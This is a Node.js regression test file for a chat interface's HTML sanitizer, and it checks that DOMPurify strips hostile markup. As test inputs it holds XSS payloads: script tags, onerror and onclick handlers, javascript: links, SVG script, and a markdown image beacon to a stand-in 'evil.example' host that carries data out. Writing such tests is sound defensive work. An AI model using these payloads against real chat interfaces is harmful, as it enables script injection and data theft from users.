// Chat HTML sanitizer regression tests: runs the sanitizer section of static/modern_ui.js
// against the real DOMPurify + marked inside jsdom.
// Run: npm install && node tests/js/sanitize_chat_html.test.js   (also run by tests/test_chat_sanitizer.py)
const path = require('path');
const fs = require('fs');
const assert = require('assert');
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');
const { marked } = require('marked');

const uiPath = process.argv[2] || path.join(__dirname, '..', '..', 'static', 'modern_ui.js');

const src = fs.readFileSync(uiPath, 'utf8');
const start = src.indexOf('// --- Chat HTML sanitization');
const end = src.indexOf('const ModernChat = {');
assert(start !== -1 && end > start, 'sanitizer section not found');
const section = src.slice(start, end);

const dom = new JSDOM('<!doctype html><body></body>', { runScripts: 'outside-only' });
const win = dom.window;
win.DOMPurify = createDOMPurify(win);
win.marked = marked;
win.eval(section + '\nwindow.renderSanitizedMarkdown = renderSanitizedMarkdown; window.escapeHtml = escapeHtml;');

function render(text) {
    const el = win.document.createElement('div');
    win.renderSanitizedMarkdown(el, text);
    return el;
}

let failures = 0;
function check(name, fn) {
    try { fn(); console.log('PASS', name); } catch (e) { failures++; console.log('FAIL', name, '-', e.message); }
}

check('script tag removed', () => {
    const el = render('hi <script>window.pwned=1</script>');
    assert(!el.querySelector('script'));
});
check('event handler attributes removed', () => {
    const el = render('<a href="#" onclick="alert(1)">x</a><div onmouseover="alert(1)">y</div>');
    assert(!el.innerHTML.includes('onclick') && !el.innerHTML.includes('onmouseover'));
});
check('javascript: links neutralised', () => {
    const el = render('[click](javascript:alert(1)) <a href="javascript:alert(2)">b</a>');
    el.querySelectorAll('a').forEach(a => assert(!/^javascript:/i.test(a.getAttribute('href') || '')));
});
check('images (exfil beacons) removed', () => {
    const el = render('![x](https://evil.example/?d=PORTFOLIO) <img src=x onerror=alert(1)>');
    assert(!el.querySelector('img'));
});
check('inline style stripped (no overlays)', () => {
    const el = render('<div style="position:fixed;inset:0;z-index:9999">FAKE APPLY</div>');
    assert(!el.innerHTML.includes('style='));
});
check('iframe / form / button removed', () => {
    const el = render('<iframe src="https://evil"></iframe><form action="/api/basket"><button>Apply</button></form>');
    assert(!el.querySelector('iframe, form, button'));
});
check('svg payload removed', () => {
    const el = render('<svg><script>alert(1)</script><animate onbegin="alert(1)"/></svg>');
    assert(!el.querySelector('svg, script'));
});
check('links get rel=noopener and target=_blank', () => {
    const a = render('[docs](https://example.com)').querySelector('a');
    assert.strictEqual(a.getAttribute('rel'), 'noopener noreferrer nofollow');
    assert.strictEqual(a.getAttribute('target'), '_blank');
});
check('markdown formatting survives', () => {
    const el = render('# Title\n\n**bold** and `code`\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n- item');
    assert(el.querySelector('h1') && el.querySelector('strong') && el.querySelector('code') && el.querySelector('table') && el.querySelector('li'));
});
check('server payload <details> block survives with class + state', () => {
    const block = '\n\n<details class="execution-payload-details" data-payload-state="pending">\n<summary>⏳ SSoT Execution Payload (Pending Your Approval)</summary>\n<div class="payload-body">\n\n```json\n{"a": 1}\n```\n\n</div>\n</details>\n\n';
    const el = render('Summary' + block + 'tail');
    const d = el.querySelector('details.execution-payload-details');
    assert(d, 'details missing');
    assert.strictEqual(d.getAttribute('data-payload-state'), 'pending');
    assert(d.querySelector('summary').textContent.includes('Pending Your Approval'));
    assert(d.querySelector('.payload-body pre code'), 'json code block not rendered');
});
check('fails closed to plain text without DOMPurify', () => {
    const saved = win.DOMPurify;
    win.DOMPurify = undefined;
    try {
        const el = render('<img src=x onerror=alert(1)> **x**');
        assert(!el.querySelector('img') && el.textContent.includes('<img'));
    } finally { win.DOMPurify = saved; }
});
check('escapeHtml neutralises archive preview', () => {
    assert.strictEqual(win.escapeHtml('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
});

console.log(failures ? `${failures} FAILED` : 'ALL PASSED');
process.exit(failures ? 1 : 0);
